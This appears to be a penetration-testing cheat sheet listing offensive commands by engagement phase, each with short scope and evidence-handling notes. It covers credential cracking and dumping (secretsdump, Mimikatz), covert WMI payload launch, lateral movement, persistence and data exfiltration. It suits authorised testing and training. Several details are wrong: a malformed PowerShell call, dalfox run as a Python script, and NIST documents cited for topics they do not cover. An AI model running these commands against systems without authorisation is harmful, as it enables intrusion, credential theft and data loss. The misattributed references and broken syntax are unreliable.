# Task Stack: Command Reference and Automation Snippets

> Outcome: Rapid recall of high-value commands organised by engagement phase with embedded rationale and safety cues.
>
> Refer to the expanded usage guides in [`docs/cstm/commands/`](./commands/) for syntax deep-dives, log artefacts, and rollback considerations.

## Network Discovery

| Command | Why You Run It | Safety & Evidence Notes |
| --- | --- | --- |
| `sudo nmap -sC -sV -O -Pn -p- 10.0.0.0/24 -oA evidence/enum/nmap_full` | Baseline TCP fingerprinting with default scripts and version detection to map exposed services quickly. | Verify scope and change `-Pn` if host discovery is allowed; archive `nmap_full.*` in evidence repo. |
| `sudo masscan 10.0.0.0/8 -p1-65535 --rate 50000 -oG evidence/enum/masscan.gnmap` | Internet-scale port sweep to highlight high-value ranges for follow-on scans. | Tune `--rate` to stay under bandwidth thresholds; correlate hits with nmap to reduce false positives. |
| `sudo zmap -p 443 10.0.0.0/8 -o evidence/enum/zmap_443.csv` | Fast enumeration of a single critical port (e.g., TLS) for certificates and exposure mapping. | Inspect certificates for sensitive domains before storing; redact customer PII in reports. |
| `sudo arp-scan --localnet --interface eth0` | Rapid identification of live hosts on the local subnet when credentials are already on-net. | Disable when stealth is required; capture output with timestamps in `/evidence/host_discovery/`. |
| `nbtscan -r 10.0.10.0/24` | Identify NetBIOS names and workgroups in legacy Windows environments. | Run during change-approved windows; sensitive hostnames may indicate regulated systems (flag in risk sheet). |

## Credential Operations

| Command | Why You Run It | Safety & Evidence Notes |
| --- | --- | --- |
| `hashcat -a 0 -m 18200 asrep_hashes.txt wordlists/rockyou.txt --status --status-timer=60` | Offline AS-REP roast cracking loop with live progress for reporting. | Store cracked credentials in encrypted vault; rotate wordlists for OPSEC. |
| `john --format=NT --wordlist=wordlists/rockyou.txt hashes.txt` | Quick NT hash cracking in lab scenarios. | Document wordlist provenance; wipe temporary files after assessment. |
| `python3 kerberoast.py --users users.txt --domain corp.local` | Targeted Kerberos SPN ticket extraction. | Throttle requests to avoid lockouts; note service accounts tied to critical systems. |
| `secretsdump.py corp.local/user:pass@dc01` | Credential dumping with Impacket for DC pivoting. | Run from controlled host; hash material is sensitive—mark for restricted handling. |
| `gpp-decrypt cpassword` | Decrypt legacy Group Policy Preferences passwords. | Immediately report if production passwords discovered; advise remediation. |

## Web Testing

| Command | Why You Run It | Safety & Evidence Notes |
| --- | --- | --- |
| `burpsuite --config-file configs/burp.json` | Launch Burp with pre-approved scopes, macros, and logging. | Confirm traffic is recorded per engagement policy; configure upstream proxy if required. |
| `ffuf -u https://target/FUZZ -w SecLists/Discovery/Web-Content/raft-large-files.txt -mc 200,204,301,302,403` | High-speed wordlist fuzzing to locate hidden files and directories. | Rate limit against fragile apps; note `403` hits for follow-up auth bypass attempts. |
| `python3 dalfox.py url https://target --silence` | Automated XSS discovery with sink verification. | Validate each finding manually; capture request/response pairs. |
| `nikto -h https://target` | Quick legacy web server misconfiguration scan. | Expect noisy logs; ensure customer approves intrusive checks. |
| `wapiti https://target -o evidence/web/wapiti_report` | Crawl and test for broad vulnerability classes. | Clean up generated payloads; cross-check with manual findings to avoid duplicates. |

## Service Hosting Quickstarts

Rapidly deploy hardened web drop servers for testing or evidence collection. See the linked guides for full configuration and teardown workflows.

| Stack | Bring-up & Modules | Verification & Evidence |
| --- | --- | --- |
| [Apache HTTP Server](commands/apache_setup.md) | `sudo apt install apache2 apache2-utils mod-security2` → `sudo a2enmod headers rewrite ssl security2` → `sudo a2dismod autoindex status` → enable site with hardened vhost. | `sudo apachectl configtest` → `apachectl -M | tee evidence/services/apache/modules_$(date -u +"%Y%m%dT%H%M%SZ").txt` → `curl -vk https://host` → archive `/var/log/apache2/secure_*.log`. |
| [Nginx Reverse Proxy](commands/nginx_setup.md) | `sudo apt install nginx-full` → symlink hardened server block → manage dynamic modules via `/etc/nginx/modules-enabled/*.conf`. | `sudo nginx -t` → `nginx -T > evidence/services/nginx/running_config.txt` → `curl -vk https://host` → checksum logs in `evidence/logs/nginx/`. |
| [Python HTTPS (aiohttp)](commands/python_http.md) | `python3 -m venv ~/venvs/quickhttp` → `pip install aiohttp` → generate TLS with `openssl req -x509 ...` → enforce bind addresses/systemd sandboxing. | `curl -vk https://host:8443/healthz` → `pip list --format=freeze > evidence/services/python_http/requirements.txt` → `sha256sum secure_server.py` + capture journal to `evidence/logs/python_http/`. |

## Post-Exploitation & Lateral Movement

| Command | Why You Run It | Safety & Evidence Notes |
| --- | --- | --- |
| `impacket-secretsdump corp.local/user:pass@dc01` | Dump NTDS secrets for further escalation. | Encrypt output; trigger incident response notifications per rules of engagement. |
| `wevtutil qe Security /q:"*[System[EventID=4624]]" /f:text /c:10` | Review recent logons to validate persistence or credential usage. | Do not clear logs; export to `/evidence/logs/` for post-engagement review. |
| `wmic process call create "cmd.exe /c powershell -ExecutionPolicy Bypass -File script.ps1"` | Launch signed PowerShell payloads covertly from WMI. | Ensure script includes cleanup; log PID for later termination. |
| `psexec.py corp.local/user@target cmd.exe` | Remote command execution over SMB with Impacket. | Use dedicated jump host; watch for EDR blocks—if detected, pivot to WinRM. |
| `crackmapexec smb 10.0.0.0/24 -u user -p pass --sessions` | Enumerate active sessions to spot lateral movement opportunities. | Flag privileged sessions in business risk sheet; avoid repeated failed logons. |

## Data Handling & Exfiltration

| Command | Why You Run It | Safety & Evidence Notes |
| --- | --- | --- |
| `rsync -avzP --progress target:/data ./loot` | Incremental data synchronisation with resume support. | Use throttling flags if bandwidth-constrained; hash files post-transfer. |
| `scp -r -i id_rsa user@target:/var/log ./evidence` | Secure file copy over SSH for Unix hosts. | Validate key usage is authorised; record file tree to facilitate cleanup. |
| `powershell Compress-Archive -Path C:\Data -DestinationPath C:\temp\data.zip` | Local archiving before exfiltration. | Purge archives after transfer; note data classification per customer policy. |
| `tar -czf evidence.tar.gz /var/tmp/evidence` ([guide](./commands/tar.md)) | POSIX-friendly archival for tool outputs. | Avoid including system-sensitive directories unintentionally; log tar listing and verify with `tar -tzf`. |
| `gzip -k -9 evidence/raw/network_logs.json` ([guide](./commands/gzip.md)) | High-compression log packaging while keeping originals intact. | Record pre/post hashes and validate with `gzip -t` before transfer. |
| `lftp -e "mirror --reverse ./reporting /dropzone" sftp://user@broker` | Automated bidirectional file sync with resume and checksums. | Verify broker fingerprint; limit credentials to scoped directories. |

## Framework Operations – Metasploit

| Command | Why You Run It | Safety & Evidence Notes |
| --- | --- | --- |
| `msfdb init` | Prepare local Metasploit PostgreSQL database for workspace tracking. | Run once per host; ensure database service is firewalled. |
| `msfconsole -q -r scripts/auto_enum.rc` | Launch scripted enumeration sequence. | Review RC scripts into version control; pause if target detection triggers. |
| `workspace -a client_redteam` | Segment loot per engagement in Metasploit. | Back up workspace nightly; purge after engagement closure. |
| `use auxiliary/scanner/rdp/cve_2019_0708_bluekeep` | Load specific module for targeted vulnerability probing. | Confirm patch status with customer; throttle threads to reduce crash risk. |
| `set VERBOSE true; run` | Increase module verbosity to collect packet captures or debug output. | Disable before noisy exploitation modules to avoid log overloads. |
| `sessions -i 1` | Interact with established session. | Record transcripts; execute post-module cleanup before exit. |
| `load kiwi` | Enable credential extraction via Mimikatz within Meterpreter. | Restricted to high-trust scenarios; notify blue team liaison prior to use. |
| `post/windows/manage/persistence_service` | Deploy controlled persistence mechanism. | Ensure auto-remove schedule is configured; document service name for teardown. |

> Deep dives, module selection matrices, and rollback procedures are covered in [`commands/metasploit.md`](./commands/metasploit.md).

## Operating System Fundamentals

### Linux & macOS (POSIX)

| Command | Why You Run It | Safety & Evidence Notes |
| --- | --- | --- |
| `uname -a` | Confirm kernel version for exploit alignment. | Note if kernel is out-of-support—record in risk sheet. |
| `cat /etc/os-release` | Gather distribution metadata. | Sensitive in shared environments; anonymise hostnames when reporting. |
| `id && groups` | Identify privileges and group memberships. | Highlight unexpected privileged groups tied to business-critical systems. |
| `sudo -l` | Enumerate permitted sudo commands for escalation. | Do not execute elevated commands without approval; log results. |
| `find / -perm -4000 -type f 2>/dev/null` | Locate SUID binaries for privilege escalation. | Restrict runtime; store list securely, as binaries may be sensitive. |
| `df -h` | Check disk usage before dumping large evidence sets. | Alert customer if critical partitions are near capacity. |
| `netstat -tulpn` / `ss -tulpn` | Review listening services. | Cross-reference with approved services list; escalate unknown daemons. |
| `launchctl list` *(macOS)* | Inspect user-level daemons. | Flag unsigned services; coordinate with macOS admin for remediation. |
| `spctl --status` *(macOS)* | Verify Gatekeeper enforcement. | Document if disabled—ties to policy controls. |

### Windows (CMD & PowerShell)

| Command | Why You Run It | Safety & Evidence Notes |
| --- | --- | --- |
| `systeminfo` | Capture OS build for patch mapping. | Store output in evidence; redact registered owner if required. |
| `wmic qfe list brief /format:table` | Enumerate installed patches. | Compare against vulnerability advisories; watch for unpatched critical KBs. |
| `net user` / `net localgroup administrators` | Audit local accounts and privilege groups. | Highlight orphaned or service accounts; link to risk register. |
| `Get-LocalGroupMember -Group "Administrators"` | PowerShell alternative with SID context. | Export to CSV for reporting; confirm RBAC approvals. |
| `Get-Service | ? {$_.Status -eq 'Running'}` | Review running services. | Identify rogue services; coordinate stop actions with client. |
| `Get-EventLog -LogName Security -Newest 20` | Inspect recent security events. | Do not clear logs; correlate with offensive actions. |
| `Get-ScheduledTask | ? {$_.TaskPath -notlike '\\Microsoft*'}` | Detect custom scheduled tasks. | Document tasks with sensitive payloads; revert changes post-engagement. |
| `Test-NetConnection -ComputerName target -Port 3389` | Validate remote service reachability. | Use before aggressive scans; note blocked ports as potential segmentation controls. |
| `Get-MpComputerStatus` | Check Windows Defender state. | If disabled, flag as high business risk in the highlight sheet. |

### Cross-Platform File & Process Hygiene

| Command | Why You Run It | Safety & Evidence Notes |
| --- | --- | --- |
| `sha256sum <file>` / `shasum -a 256 <file>` | Integrity check for transferred tools. | Record hashes in evidence logs; compare with baseline. |
| `ps aux` / `tasklist` / `top` / `Get-Process` | Enumerate active processes for anomaly detection. | Validate no unexpected high-privileged processes were spawned. |
| `grep -R "password" /etc` / `Select-String -Path C:\\ -Pattern "password"` | Locate credential artefacts for cleanup. | Use targeted paths to avoid DoS; handle discovered secrets per policy. |
| `traceroute target` / `tracert target` | Map network path to identify filtering. | Document hops crossing regulated boundaries; inform customer if traffic leaves jurisdiction. |
| `curl -vk https://target` | Inspect TLS negotiation and certificates. | Avoid uploading sensitive client certs; store output in TLS assessment folder. |

## Automation Template – Baseline TCP + Top UDP

```bash
#!/usr/bin/env bash
# quick_nmap.sh - run baseline TCP + top UDP scan with evidence handling
set -euo pipefail
TARGET="$1"
OUTDIR="evidence/enum/${TARGET//\//_}"
timestamp=$(date -u +"%Y%m%dT%H%M%SZ")
mkdir -p "$OUTDIR"
log="$OUTDIR/quick_nmap_$timestamp.log"
{
  echo "[+] Starting scans at $timestamp for $TARGET"
  nmap -sS -sV -Pn -p- "$TARGET" -oA "$OUTDIR/tcp_full_$timestamp"
  nmap -sU --top-ports 100 "$TARGET" -oA "$OUTDIR/udp_top100_$timestamp"
  echo "[+] Completed scans at $(date -u +"%Y%m%dT%H%M%SZ")"
} | tee "$log"
```

> Store the script under version control, sign it if possible, and reference the generated log in the business risk highlight sheet when scan results expose critical services.

## Appendix: Protocol & Encoding Quick Reference

### Common TCP Ports

| Port | Service | Usage Notes | Deep Dive |
| --- | --- | --- | --- |
| 22/tcp | SSH | Default remote administration; enumerate strong ciphers and note banner leakage for compliance reviews. | [SSH Security Considerations (RFC 4251)](https://datatracker.ietf.org/doc/html/rfc4251) |
| 23/tcp | Telnet | Legacy plaintext access—treat any exposure as critical and pivot to credential hygiene tasks. | [IANA Telnet Registry](https://www.iana.org/assignments/telnet-options/telnet-options.xhtml) |
| 25/tcp | SMTP | Review for open relay and spoofing; confirm STARTTLS support before sending probes. | [RFC 5321](https://datatracker.ietf.org/doc/html/rfc5321) |
| 53/tcp | DNS (zone transfers) | Attempt `AXFR` to pull zones; ensure customer approvals before running recursive tests. | [IANA DNS Parameters](https://www.iana.org/assignments/dns-parameters/dns-parameters.xhtml) |
| 80/tcp | HTTP | Launch baseline reconnaissance; capture headers for technology fingerprinting. | [RFC 9110](https://www.rfc-editor.org/rfc/rfc9110) |
| 110/tcp | POP3 | Verify if legacy mailboxes expose credentials; prefer TLS upgrade via `STLS`. | [RFC 1939](https://www.rfc-editor.org/rfc/rfc1939) |
| 135/tcp | MSRPC | Indicator of Windows services; pair with 445 for DCE/RPC enumeration. | [MS-RPCE Protocol](https://learn.microsoft.com/openspecs/windows_protocols/ms-rpce) |
| 139/tcp | NetBIOS-SSN | Supports SMB over NetBIOS; run `nbtscan` or `smbclient -L` for share discovery. | [SMB Protocol Family](https://learn.microsoft.com/windows/win32/fileio/microsoft-smb-protocol-and-cifs-protocol-overview) |
| 443/tcp | HTTPS | Focus on TLS posture (cipher suites, cert reuse); log certificate chains for later trust analysis. | [TLS 1.3 (RFC 8446)](https://www.rfc-editor.org/rfc/rfc8446) |
| 445/tcp | SMB | High-value for credential relay, share mapping, and LSASS pivoting—correlate with Kerberos telemetry. | [MS-SMB2 Protocol](https://learn.microsoft.com/openspecs/windows_protocols/ms-smb2) |
| 5985/tcp | WinRM (HTTP) | Windows remote management over HTTP; validate TLS on 5986 before credential use. | [WinRM Overview](https://learn.microsoft.com/windows/win32/winrm/portal) |
| 8080/tcp | HTTP Alt / Proxies | Identify admin panels or proxy interfaces; capture authentication flows. | [Common Ports (IANA)](https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml) |

### Common UDP Ports

| Port | Service | Usage Notes | Deep Dive |
| --- | --- | --- | --- |
| 53/udp | DNS | Test recursion and response spoofing; combine with TCP for zone transfer validation. | [IANA DNS Parameters](https://www.iana.org/assignments/dns-parameters/dns-parameters.xhtml) |
| 67/udp | DHCP Server | Rogue DHCP opportunities—monitor scope options for credential leakage. | [RFC 2131](https://www.rfc-editor.org/rfc/rfc2131) |
| 68/udp | DHCP Client | Useful for listening to broadcasts when sniffing; avoid interfering with production leases. | [RFC 2131](https://www.rfc-editor.org/rfc/rfc2131) |
| 69/udp | TFTP | Often misconfigured with anonymous read/write; grab configs but maintain evidence hashes. | [RFC 1350](https://www.rfc-editor.org/rfc/rfc1350) |
| 123/udp | NTP | Validate for reflection potential; compare offsets to detect tampering. | [RFC 5905](https://www.rfc-editor.org/rfc/rfc5905) |
| 137/udp | NetBIOS Name Service | Send `nbtstat` queries to gather hostnames; watch for leakage of domain naming schemes. | [NetBIOS over TCP/IP (RFC 1001/1002)](https://www.rfc-editor.org/rfc/rfc1001) |
| 161/udp | SNMP | Attempt v1/v2 community strings; escalate to config extraction once authenticated. | [RFC 1157](https://www.rfc-editor.org/rfc/rfc1157) |
| 389/udp | LDAP (CLDAP) | Check for CLDAP reflection or domain controller exposure; log findings for blue team follow-up. | [LDAP (RFC 4511)](https://www.rfc-editor.org/rfc/rfc4511) |
| 500/udp | IKE | Indicates VPN endpoints; capture proposals with `ike-scan` to map IPSec posture. | [RFC 7296](https://www.rfc-editor.org/rfc/rfc7296) |
| 514/udp | Syslog | Monitor for log exfil paths; confirm message integrity if tampering suspected. | [RFC 5426](https://www.rfc-editor.org/rfc/rfc5426) |
| 1900/udp | SSDP | Enumerate UPnP devices; leverage `upnp-info` NSE scripts to profile network appliances. | [UPnP Device Architecture](https://openconnectivity.org/wp-content/uploads/2015/12/UPnP-DA-Architecture-2.0.pdf) |
| 5353/udp | mDNS | Supports local service discovery; sniff for sensitive service advertisements. | [RFC 6762](https://www.rfc-editor.org/rfc/rfc6762) |

### Core Protocol Summaries

| Protocol | Purpose | Red Team Usage Notes | Reference |
| --- | --- | --- | --- |
| SMB (CIFS/SMB2) | File and printer sharing over TCP 445. | Pivot for credential theft, share enumeration, and lateral movement; combine with Kerberos abuse for relay. | [MS-SMB2 Protocol Spec](https://learn.microsoft.com/openspecs/windows_protocols/ms-smb2) |
| RDP | Remote desktop over TCP 3389 with TLS/Network Level Authentication. | Capture screenshots, check for `CredSSP` downgrade, and test BlueKeep/DejaBlue cautiously. | [RDP Security (MS Docs)](https://learn.microsoft.com/windows-server/remote/remote-desktop-services/clients/remote-desktop-security) |
| HTTPS/TLS | Encrypted web transport on TCP 443. | Perform certificate inventory, downgrade attempts, and JA3 fingerprinting to spot monitoring gaps. | [TLS 1.3 (RFC 8446)](https://www.rfc-editor.org/rfc/rfc8446) |
| DNS | Name resolution via UDP/TCP 53. | Exfil via DNS tunnelling, enumerate subdomains, and validate split-brain exposures. | [DNS Overview (RFC 8499)](https://www.rfc-editor.org/rfc/rfc8499) |
| Kerberos | Authentication protocol over TCP/UDP 88. | Execute AS-REP roasting, Kerberoasting, and S4U abuse while watching for lockouts. | [Kerberos (RFC 4120)](https://www.rfc-editor.org/rfc/rfc4120) |
| LDAP | Directory access over TCP 389/636. | Extract AD schema, enumerate ACLs, and test LDAPS enforcement. | [LDAP (RFC 4511)](https://www.rfc-editor.org/rfc/rfc4511) |
| SNMP | Device management over UDP 161/162. | Bruteforce community strings, pull configs, and note SNMPv1/v2c exposures for remediation. | [SNMP (RFC 1157)](https://www.rfc-editor.org/rfc/rfc1157) |
| NTP | Time synchronisation over UDP 123. | Monitor for amplification vectors and time-skew opportunities affecting Kerberos tickets. | [NTPv4 (RFC 5905)](https://www.rfc-editor.org/rfc/rfc5905) |
| SMTP | Mail transfer over TCP 25/587/465. | Abuse for phishing simulations, enumerate VRFY/EXPN, and test SPF/DMARC resilience. | [SMTP (RFC 5321)](https://datatracker.ietf.org/doc/html/rfc5321) |
| WinRM | Remote management over TCP 5985/5986. | Launch PowerShell remoting, check for certificate auth, and log transcripts for evidence. | [WinRM Overview](https://learn.microsoft.com/windows/win32/winrm/portal) |

### ASCII & Hex Conversion Cheat Sheet

| Character | Decimal | Hex | Notes |
| --- | --- | --- | --- |
| `NUL` | 0 | `0x00` | String terminator in C; watch for truncation in exploit payloads. |
| `TAB` | 9 | `0x09` | Use when crafting tab-delimited payloads or bypassing naive filters. |
| `LF` | 10 | `0x0A` | Unix newline; required for many protocol delimiters (HTTP headers). |
| `CR` | 13 | `0x0D` | Pair with `LF` for HTTP/SMTP commands; detect CRLF injection. |
| Space | 32 | `0x20` | URL-encode as `%20` when fuzzing HTTP requests. |
| `0`–`9` | 48–57 | `0x30`–`0x39` | Numeric ASCII range; offsets simplify brute-force loops. |
| `A`–`Z` | 65–90 | `0x41`–`0x5A` | Uppercase letters; helpful for case-sensitive shellcode encoders. |
| `a`–`z` | 97–122 | `0x61`–`0x7A` | Lowercase letters; subtract `0x20` to shift to uppercase. |
| `{` | 123 | `0x7B` | Often used in JSON and template payloads—escape in PowerShell. |
| `|` | 124 | `0x7C` | Pipe operator on POSIX shells; encode to bypass WAF signatures. |
| `}` | 125 | `0x7D` | Close JSON/format strings; ensure proper escaping in injection payloads. |
| `~` | 126 | `0x7E` | Tilde expansion on shells; encode when delivering payloads to Windows CMD. |

#### Conversion Utilities

- Quickly convert between ASCII and hex on POSIX systems: `printf 'payload' | xxd -p` and `printf '%b' "\x70\x61\x79"`.
- Use Python for reversible conversions: `python3 -c "import binascii; print(binascii.hexlify(b'admin'))"` and `python3 -c "print(bytes.fromhex('61646d696e'))"`.
- For Windows, leverage PowerShell: `[System.BitConverter]::ToString([Text.Encoding]::UTF8.GetBytes('admin'))` and `[Text.Encoding]::UTF8.GetString(0x61,0x64,0x6d,0x69,0x6e)`.

#### Reference Tables

- Printable ASCII matrix: [ASCII Table (NIST IR 7966)](https://nvlpubs.nist.gov/nistpubs/ir/2013/NIST.IR.7966.pdf)
- Hexadecimal primer: [NIST SP 800-125A Appendix A](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-125A.pdf)
- Encoding overview: [OWASP Cheat Sheet – Output Encoding](https://cheatsheetseries.owasp.org/cheatsheets/Output_Encoding_Cheat_Sheet.html)
